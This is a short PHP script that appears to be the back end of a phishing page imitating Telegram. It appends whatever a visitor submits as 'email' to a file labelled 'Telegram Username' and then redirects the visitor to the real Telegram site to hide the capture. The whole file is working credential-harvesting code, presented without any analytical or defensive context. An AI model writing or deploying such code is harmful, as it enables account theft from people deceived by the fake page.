<?php
file_put_contents("usernames.txt", "Telegram Username: " . $_POST['email'] . "\n", FILE_APPEND);
$url = "https://telegram.org/"; # https://telegram.org/
header("Location: $url");
?>
